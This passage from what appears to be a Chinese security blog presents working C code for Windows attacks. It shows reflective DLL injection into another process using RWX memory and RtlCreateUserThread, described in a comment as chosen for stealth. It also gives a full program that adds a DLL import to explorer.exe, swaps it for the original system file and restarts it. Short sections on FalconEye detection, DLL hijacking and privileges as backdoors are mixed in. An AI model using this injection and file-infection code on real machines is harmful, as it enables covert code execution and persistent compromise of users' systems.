<h4 id="反射式dll注入"><a class="markdownIt-Anchor" href="#反射式dll注入">#</a> 反射式 dll 注入</h4>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">extern &quot;C&quot; HANDLE __stdcall LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter);</span><br><span class="line"> </span><br><span class="line">DWORD demoReflectiveDllInjection(PCWSTR cpDllFile, DWORD dwProcessId)</span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hFile = NULL;//创建的dll文件句柄</span><br><span class="line">    HANDLE hModule = NULL;//开辟的堆空间句柄</span><br><span class="line">    HANDLE hProcess = NULL;//目标进程句柄</span><br><span class="line">    LPVOID lpBuffer = NULL;</span><br><span class="line">    DWORD dwLength = 0;</span><br><span class="line">    DWORD dwBytesRead = 0;</span><br><span class="line"> </span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">        hFile = CreateFileW(cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        dwLength = GetFileSize(hFile, NULL);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">#ifdef _DEBUG</span><br><span class="line">        wprintf(TEXT(&quot;[+] File Size: %d\n&quot;), dwLength);</span><br><span class="line">#endif</span><br><span class="line">        //为dll文件开辟堆空间 ！！！！！！！！这是在自己的进程内存中  分配堆内存</span><br><span class="line">        lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);</span><br><span class="line"> </span><br><span class="line">        //将dll文件读进开辟的堆空间中 hfile--》lpbuffer</span><br><span class="line">        if (ReadFile(hFile, lpBuffer, dwLength, &amp;dwBytesRead, NULL) == FALSE) BREAK_WITH_ERROR(&quot;[-] Failed to alloc a buffer!&quot;);</span><br><span class="line">        //获得目标进程的句柄</span><br><span class="line">        hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);</span><br><span class="line"> </span><br><span class="line">        // LoadRemoteLibraryR：在dll模块加载到内存时获取入口点,并且实现调用该函数（采用rtlcreateuserthread的方式）远程线程注入</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        WaitForSingleObject(hModule, -1);</span><br><span class="line"> </span><br><span class="line">    &#125; while (0);</span><br><span class="line"> </span><br><span class="line">    //注入完毕，释放堆空间，关闭进程句柄</span><br><span class="line">    if (lpBuffer) HeapFree(GetProcessHeap(), 0, lpBuffer);</span><br><span class="line"> </span><br><span class="line">    if (hProcess) CloseHandle(hProcess);</span><br><span class="line"> </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            //检查库是否有ReflectiveLoader</span><br><span class="line"> </span><br><span class="line">            // 获得dll文件的入口点偏移</span><br><span class="line">            dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);//lpbuffer:堆内存的指针 指向存有dll文件的堆内存空间</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            // alloc memory (RWX) in the host process for the image...</span><br><span class="line">            //为映像分配内存</span><br><span class="line">            lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            // write the image into the host process...</span><br><span class="line">            //将映像写入目标进程</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            /*</span><br><span class="line">            BOOL WriteProcessMemory(</span><br><span class="line">            HANDLE hProcess,</span><br><span class="line">                LPVOID lpBaseAddress, 要写的内存首地址</span><br><span class="line">                LPVOID lpBuffer, 指向要写的数据的指针</span><br><span class="line">                DWORD nSize,</span><br><span class="line">                LPDWORD lpNumberOfBytesWritten</span><br><span class="line">                );</span><br><span class="line">                */</span><br><span class="line"> </span><br><span class="line">                //将映像写入目标进程  lpRemoteLibraryBuffer  在目标进程中分配的内存空间 lpBuffer在该进程内存空间中分配的堆内存</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            // add the offset to ReflectiveLoader() to the remote library address...</span><br><span class="line">            //lpRemoteLibraryBuffer 分配的内存地址 +dwReflectiveLoaderOffset  入口点偏移</span><br><span class="line"> </span><br><span class="line">            lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);</span><br><span class="line"> </span><br><span class="line">            // create a remote thread in the host process to call the ReflectiveLoader!</span><br><span class="line">            //OutputDebugString(&quot;INJECTING DLL!&quot;);</span><br><span class="line"> </span><br><span class="line">            //本身反射性dll 就隐蔽性高，自然不可以用createremoteprocess</span><br><span class="line"> </span><br><span class="line">            RtlCreateUserThread = (PRTL_CREATE_USER_THREAD)(GetProcAddress(GetModuleHandle(TEXT(&quot;ntdll&quot;)), &quot;RtlCreateUserThread&quot;));</span><br><span class="line">            RtlCreateUserThread(hProcess, NULL, 0, 0, 0, 0, lpReflectiveLoader, lpParameter, &amp;hThread, NULL); //lpReflectiveLoader 线程函数地址，dll入口函数地址 lpParameter 参数</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"> </span><br><span class="line">            //释放掉为dll映像分配的内存</span><br><span class="line">            VirtualFreeEx(hProcess, lpRemoteLibraryBuffer, dwLength, MEM_RELEASE);</span><br><span class="line"> </span><br><span class="line">        &#125; while (0);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line">        hThread = NULL;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    return hThread;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>用 FalconEye 实时检测 Windows 进程注入行为</li>
</ul>
<ol>
<li>
<p>FalconEye 是一款功能强大的 Windows 终端安全检测工具，可以帮助广大研究人员实时检测 Windows 进程注入行为。FalconEye 也是一个内核模式驱动工具，旨在实现实时的进程注入行为。由于 FalconEye 需要以内核模式运行，它可以提供一个强大可靠的安全防御机制来抵御那些尝试绕过各种用户模式钩子的进程注入技术。</p>
</li>
<li>
<p>FalconEye 驱动器是一种按需加载的驱动程序；</p>
<p>初始化包括通过 libinfinityhook 设置回调和 syscall 钩子；</p>
<p>回调维护从跨流程活动（如 OpenProcess）构建的 Pids 的映射，但不限于 OpenProcess；</p>
<p>随后的回调和 syscall 钩子使用这个 Pid 映射来减少处理中的噪声；</p>
<p>作为降噪的一部分，syscall 钩子可以过滤掉相同的进程活动；</p>
<p>检测逻辑分为多种子类，即无状态（例如：Atombombing）、有状态（Unmap+Overwrite）和浮动代码（多种技术实现的 Shellcode）；</p>
<p>针对有状态的检测，syscall 钩子会记录一个 ActionHistory（历史活动），比如说，它会记录所有的 NtWriteVirtualMemory 调用；</p>
<p>检测逻辑具有常见的异常检测功能，如浮动代码检测和远程进程中 Shellcode 触发器的检测。回调和 syscall 钩子都会调用这个公共功能来进行实际检测；</p>
</li>
<li>
<p>项目来源 https://www.freebuf.com/articles/system/281129.html</p>
</li>
</ol>
<h3 id="dll-劫持"><a class="markdownIt-Anchor" href="#dll-劫持">#</a> DLL 劫持</h3>
<p>DLL 劫持指的是，病毒通过一些手段来劫持或者替换正常的 DLL，欺骗正常程序加载预先准备好的恶意 DLL。</p>
<p>如下图，LPK.dll 是应用程序运行所需加载的 DLL，该系统文件默认在 C:\Windows\system32 路径下，但由于 windows 优先搜索当前路径，所以当我们把恶意 LPK.dll 放在应用程序同一路径下，便会被程序成功加载，从而执行恶意操作。</p>
<p>没有对文件名做校验，没有对路径做校验，没有签名</p>
<p>检测 DLL 劫持漏洞方法：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yYXR0bGVyL3JlbGVhc2Vz">https://github.com/sensepost/rattler/releases</span></p>
<h3 id="输入表感染"><a class="markdownIt-Anchor" href="#输入表感染">#</a> 输入表感染</h3>
<p>在 explorer.exe 中添加了 MyDLL.dll 的一个导出函数 MainFun，如果你想先看看效果可以先把附件下下来，把其中的 MyDLL.dll 放入环境变量 path 目录中，例如 system32 目录就可满足你的需要，然后运行 InfectImport.exe, 你会看到一个对话框 “MainFun 成功导入 explorer.exe”，因为我在 dll 被加载时启动了一个线程，然后输出这句话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;IMAGEHLP.H&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#pragma comment(lib,&quot;IMAGEHLP.lib&quot;)</span><br><span class="line"></span><br><span class="line">//用来计算对齐数据后的大小</span><br><span class="line">int alig(int size,unsigned int align)</span><br><span class="line">&#123;</span><br><span class="line">  if(size%align!=0)</span><br><span class="line">    return (size/align+1)*align;</span><br><span class="line">  else</span><br><span class="line">    return size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char WinPath[MAX_PATH];</span><br><span class="line">  char FilePath[MAX_PATH];</span><br><span class="line">  char NewPath[MAX_PATH];</span><br><span class="line">  char TemPath[MAX_PATH];</span><br><span class="line">  char LogPath[MAX_PATH];</span><br><span class="line">  FILE* fp;</span><br><span class="line"></span><br><span class="line">  ::GetWindowsDirectory(WinPath,sizeof(WinPath));  //获取windows所在目录</span><br><span class="line">  ::memcpy(FilePath,WinPath,sizeof(WinPath));</span><br><span class="line">  ::memcpy(NewPath,WinPath,sizeof(WinPath));</span><br><span class="line">  ::memcpy(TemPath,WinPath,sizeof(WinPath));</span><br><span class="line">  ::memcpy(LogPath,WinPath,sizeof(WinPath));</span><br><span class="line"></span><br><span class="line">  ::strcat(FilePath,&quot;\\explorer.exe&quot;);             //得到原文件路径</span><br><span class="line">  ::strcat(NewPath,&quot;\\explorer1.exe&quot;);             //修改文件路径</span><br><span class="line">  ::strcat(TemPath,&quot;\\temp.mainst&quot;);               //临时文件路径</span><br><span class="line">  ::strcat(LogPath,&quot;\\log.dat&quot;);             //log文件路径，防止修改修改过的explorer.exe</span><br><span class="line"></span><br><span class="line">  //拷贝原始文件，为修改做准备</span><br><span class="line">  ::CopyFile(FilePath,NewPath,false);</span><br><span class="line">  ::CopyFile(FilePath,TemPath,false);</span><br><span class="line"></span><br><span class="line">  fp=::fopen(LogPath,&quot;r&quot;);</span><br><span class="line">  if(fp != NULL)</span><br><span class="line">  &#123;</span><br><span class="line">    MessageBox(NULL,&quot;explorer.exe已被修改过!&quot;,&quot;提示&quot;,MB_OK);</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //打开需要修改的文件</span><br><span class="line">  fp=::fopen(NewPath,&quot;rb+&quot;);</span><br><span class="line">  if(fp==NULL)</span><br><span class="line">  &#123;</span><br><span class="line">    ::DeleteFile(NewPath);</span><br><span class="line">    ::DeleteFile(TemPath);</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //往explorer.exe中添加我们准备好的函数</span><br><span class="line">  LOADED_IMAGE img;</span><br><span class="line">  HANDLE hFile;</span><br><span class="line">  PUCHAR lpBaseAddr;</span><br><span class="line">  PIMAGE_NT_HEADERS lpPEhead;</span><br><span class="line">  PIMAGE_IMPORT_DESCRIPTOR lpImport,lpNewImport;</span><br><span class="line">  ULONG ImportSize,NewImportSize;</span><br><span class="line">  PIMAGE_SECTION_HEADER lpFirstSection;</span><br><span class="line">  //保存文件对齐值与区块对齐值</span><br><span class="line">  int SECTION_ALIG;</span><br><span class="line">  int FILE_ALIG;</span><br><span class="line">  int fre=0;</span><br><span class="line">  int i=0;</span><br><span class="line">  int nOldSectionNo;</span><br><span class="line">  DWORD NewSecRVA,NewOffset,ThunkRVA,ImportRVA;</span><br><span class="line">  IMAGE_SECTION_HEADER  NewSection;//要添加的区块</span><br><span class="line">  IMAGE_NT_HEADERS NewNThead;</span><br><span class="line">  memset(&amp;NewSection, 0, sizeof(IMAGE_SECTION_HEADER));</span><br><span class="line">  IMAGE_SECTION_HEADER LastSection;                            //再定义一个区块，来保存原文件最后一个区块的信息</span><br><span class="line"></span><br><span class="line">  //对以下使用的函数如果不太熟悉的，可以看看与PE文件相关的函数</span><br><span class="line">  if(MapAndLoad(&quot;temp.mainst&quot;,WinPath,&amp;img,false,false))       //获得PE文件相关数据</span><br><span class="line">  &#123;</span><br><span class="line">    hFile=img.hFile;</span><br><span class="line">    lpBaseAddr=img.MappedAddress;</span><br><span class="line">    lpPEhead=img.FileHeader;</span><br><span class="line">    lpImport=(PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToData</span><br><span class="line"></span><br><span class="line">      (lpBaseAddr,FALSE,IMAGE_DIRECTORY_ENTRY_IMPORT,&amp;ImportSize);</span><br><span class="line">    ImportSize=lpPEhead-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;</span><br><span class="line">    nOldSectionNo=lpPEhead-&gt;FileHeader.NumberOfSections;</span><br><span class="line">    SECTION_ALIG=lpPEhead-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line">    FILE_ALIG=lpPEhead-&gt;OptionalHeader.FileAlignment;</span><br><span class="line">    lpFirstSection=img.Sections;</span><br><span class="line">    NewImportSize=ImportSize+sizeof(IMAGE_IMPORT_DESCRIPTOR);</span><br><span class="line">    //获取最后一个节</span><br><span class="line">    memcpy(&amp;LastSection,(PIMAGE_SECTION_HEADER)((DWORD)img.Sections+sizeof(IMAGE_SECTION_HEADER)*(nOldSectionNo-1)),sizeof(IMAGE_SECTION_HEADER));</span><br><span class="line">    //计算新节的RVA</span><br><span class="line">    NewSecRVA=LastSection.VirtualAddress+alig(LastSection.Misc.VirtualSize,SECTION_ALIG);</span><br><span class="line">    //计算新节的文件偏移</span><br><span class="line">    NewOffset=LastSection.PointerToRawData+alig(LastSection.SizeOfRawData,FILE_ALIG);</span><br><span class="line">    //写入DLL名</span><br><span class="line">    fseek(fp,NewOffset,SEEK_SET);</span><br><span class="line">    fre=sizeof(&quot;MyDLL.dll&quot;);</span><br><span class="line">    ::fwrite(&quot;MyDLL.dll&quot;,sizeof(&quot;MyDLL.dll&quot;),1,fp);</span><br><span class="line"></span><br><span class="line">    //准备IMAGE_IMPORT_BY_NAME结构</span><br><span class="line">    IMAGE_IMPORT_BY_NAME ImportFun;</span><br><span class="line">    ImportFun.Hint=0;</span><br><span class="line">    memcpy(ImportFun.Name,&quot;MainFun&quot;,sizeof(&quot;MainFun&quot;));</span><br><span class="line"></span><br><span class="line">    DWORD ThunkData[2];</span><br><span class="line">    ThunkData[0]=NewSecRVA+fre;</span><br><span class="line">    ThunkData[1]=0;</span><br><span class="line"></span><br><span class="line">    //写入IMAGE_IMPORT_BY_NAME结构</span><br><span class="line">    fseek(fp,NewOffset+fre,SEEK_SET);</span><br><span class="line">    fre+=sizeof(&quot;MainFun&quot;)+sizeof(WORD);</span><br><span class="line">    ::fwrite(&amp;ImportFun,sizeof(&quot;MainFun&quot;)+sizeof(WORD),1,fp);</span><br><span class="line"></span><br><span class="line">    fseek(fp,NewOffset+fre,SEEK_SET);</span><br><span class="line">    ThunkRVA=NewSecRVA+fre;</span><br><span class="line">    fre+=sizeof(DWORD)*2;</span><br><span class="line">    ::fwrite(ThunkData,sizeof(DWORD)*2,1,fp);</span><br><span class="line"></span><br><span class="line">    ImportRVA=NewSecRVA+fre;</span><br><span class="line">    //准备新导入表结构，用来写入新文件</span><br><span class="line">    lpNewImport=(PIMAGE_IMPORT_DESCRIPTOR)::malloc(NewImportSize);</span><br><span class="line">    memset(lpNewImport,0,NewImportSize);</span><br><span class="line">    memcpy(lpNewImport,lpImport,ImportSize);</span><br><span class="line"></span><br><span class="line">    //在导入表尾部组织一个新的导入项</span><br><span class="line">    while(1)</span><br><span class="line">    &#123;</span><br><span class="line">      if(lpNewImport[i].OriginalFirstThunk == 0 &amp;&amp; lpNewImport[i].TimeDateStamp == 0 &amp;&amp;</span><br><span class="line">        lpNewImport[i].ForwarderChain == 0 &amp;&amp; lpNewImport[i].Name == 0 &amp;&amp; lpNewImport[i].FirstThunk == 0)</span><br><span class="line">      &#123;</span><br><span class="line">        lpNewImport[i].Name=NewSecRVA;</span><br><span class="line">        lpNewImport[i].TimeDateStamp=0;</span><br><span class="line">        lpNewImport[i].ForwarderChain=0;</span><br><span class="line">        lpNewImport[i].FirstThunk=ThunkRVA;</span><br><span class="line">        lpNewImport[i].OriginalFirstThunk=ThunkRVA;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">      else i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fseek(fp,NewOffset+fre,SEEK_SET);</span><br><span class="line">    fre += NewImportSize;</span><br><span class="line">    fwrite(lpNewImport,NewImportSize,1,fp);</span><br><span class="line">    ::free(lpNewImport);</span><br><span class="line"></span><br><span class="line">    //文件对齐</span><br><span class="line">    int num=alig(fre,FILE_ALIG)-fre;</span><br><span class="line">    for(i=0; i&lt;num; i++)</span><br><span class="line">      fputc(&#x27;\0&#x27;,fp);</span><br><span class="line">    //添加名为.newsec的新节</span><br><span class="line">    strcpy((char*)NewSection.Name,&quot;.newsec&quot;);</span><br><span class="line">    NewSection.VirtualAddress=NewSecRVA;</span><br><span class="line">    NewSection.PointerToRawData=NewOffset;</span><br><span class="line">    NewSection.Misc.VirtualSize=alig(fre,SECTION_ALIG);</span><br><span class="line">    NewSection.SizeOfRawData=alig(fre,FILE_ALIG);</span><br><span class="line">    NewSection.Characteristics=0xC0000040;</span><br><span class="line"></span><br><span class="line">    fseek(fp,((DWORD)lpFirstSection-(DWORD)lpBaseAddr)+sizeof(IMAGE_SECTION_HEADER)*nOldSectionNo,0);</span><br><span class="line"></span><br><span class="line">    //写入新的节表</span><br><span class="line">    fwrite(&amp;NewSection,sizeof(IMAGE_SECTION_HEADER),1,fp);</span><br><span class="line"></span><br><span class="line">    //更新第一块节表属性</span><br><span class="line">    //此处为我困惑的地方，为什么要把第一个节的属性设为0xE0000020</span><br><span class="line">    //这个结论我是从比较loadPE修改过的文件中得出的</span><br><span class="line">    //如果没有此处工作，修改后的文件无法正常运行</span><br><span class="line">    //希望高人能给我解答下</span><br><span class="line">    memcpy(&amp;NewSection,lpFirstSection,sizeof(IMAGE_SECTION_HEADER));</span><br><span class="line">    NewSection.Characteristics=0xE0000020;</span><br><span class="line">    fseek(fp,(DWORD)lpFirstSection-(DWORD)lpBaseAddr,SEEK_SET);</span><br><span class="line">    fwrite(&amp;NewSection,sizeof(IMAGE_SECTION_HEADER),1,fp);</span><br><span class="line"></span><br><span class="line">    memcpy(&amp;NewNThead,lpPEhead,sizeof(IMAGE_NT_HEADERS));</span><br><span class="line">    int nNewImageSize=lpPEhead-&gt;OptionalHeader.SizeOfImage+alig(fre,SECTION_ALIG);</span><br><span class="line">    NewNThead.OptionalHeader.SizeOfImage=nNewImageSize;</span><br><span class="line">    NewNThead.OptionalHeader.DataDirectory[11].Size=0;</span><br><span class="line">    NewNThead.OptionalHeader.DataDirectory[11].VirtualAddress=0;</span><br><span class="line">    NewNThead.OptionalHeader.DataDirectory[12].Size=0;</span><br><span class="line">    NewNThead.OptionalHeader.DataDirectory[12].VirtualAddress=0;</span><br><span class="line">    NewNThead.FileHeader.NumberOfSections=nOldSectionNo+1;</span><br><span class="line">    NewNThead.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress=ImportRVA;</span><br><span class="line">    NewNThead.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size=NewImportSize;</span><br><span class="line">    fseek(fp,(DWORD)(lpPEhead)-(DWORD)lpBaseAddr,SEEK_SET);</span><br><span class="line"></span><br><span class="line">    //写入更新后的PE头</span><br><span class="line">    fwrite(&amp;NewNThead,sizeof(IMAGE_NT_HEADERS),1,fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    UnMapAndLoad(&amp;img);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    ::DeleteFile(NewPath);</span><br><span class="line">    ::DeleteFile(TemPath);</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //删除临时文件</span><br><span class="line">  ::DeleteFile(TemPath);</span><br><span class="line">  //干掉explorer.exe</span><br><span class="line">  ::rename(FilePath,TemPath);</span><br><span class="line">  //让我们修改过后的替换掉explorer.exe</span><br><span class="line">  ::rename(NewPath,FilePath);</span><br><span class="line"></span><br><span class="line">  //创建日志文件，以免重复修改</span><br><span class="line">  fp=::fopen(LogPath,&quot;w&quot;);</span><br><span class="line">  fclose(fp);</span><br><span class="line"></span><br><span class="line">  //重新运行explorer</span><br><span class="line">  ::system(&quot;taskkill /F /im explorer.exe&quot;);</span><br><span class="line">  ::system(&quot;explorer.exe&quot;);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="进程特权"><a class="markdownIt-Anchor" href="#进程特权">#</a> 进程特权</h3>
<p>Windows 操作系统中许多操作都需要有对应的特权，特权也是一种非常隐蔽的留后门的方式。在 AD 域中，一些特权在<strong> Default Domain Controller Policy</strong> 组策略中被授予给一些特殊的组，这些组的成员虽然不是域管，但如果被攻击者控制同样能给 AD 域带来巨大的风险</p>
<p>特权是一个用户或组在本地计算机执行各种系统相关操作（关闭系统、装载设备驱动程序、改变系统时间）的权限，特权与访问权限的区别如下：</p>
<p>特权控制账户对系统资源和系统相关任务的访问，而访问权限控制对安全对象（可以具有安全描述符的对象）的访问</p>
<p>系统管理员为用户或组指派特权，而系统根据对象的 DACL 中的 ACE 授予或拒绝对安全对象的访问，有时拥有特权可以忽略 ACL 的检查</p>
<p>Access Token，其中有一部分表示了该用户及该用户所属组所拥有的特权</p>
<p>通常我们会使用 <code>whoami /priv</code>  命令查看当前用户所拥有的特权，默认情况下大部分特权是禁用状态，在使用时需要启用</p>
